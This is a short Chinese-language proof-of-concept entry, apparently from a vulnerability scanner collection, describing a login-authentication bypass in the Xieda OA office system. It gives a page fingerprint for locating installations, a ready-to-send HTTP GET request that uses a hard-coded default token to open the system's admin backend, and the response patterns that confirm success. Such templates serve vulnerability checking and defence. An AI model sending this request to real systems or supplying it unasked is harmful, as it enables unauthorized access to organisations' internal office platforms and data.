﻿# 协达OA系统绕过登录认证登陆后台漏洞

> 更新时间：2024-03-28

> 漏洞编号：

> 漏洞说明：协达OA系统是一款全面先进的OA系统。协达OA存在登录认证绕过漏洞，攻击者利用默认的token登陆系统后台。

> 漏洞特征：body="/interface/CheckLoginName.jsp"

> 验证脚本：HTTP

```
GET /stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：^(?!.*?登录信息已失效).*?$

> 上传文件定位：

> 验证文件来源：协达OA系统绕过登录认证登陆后台漏洞.poc

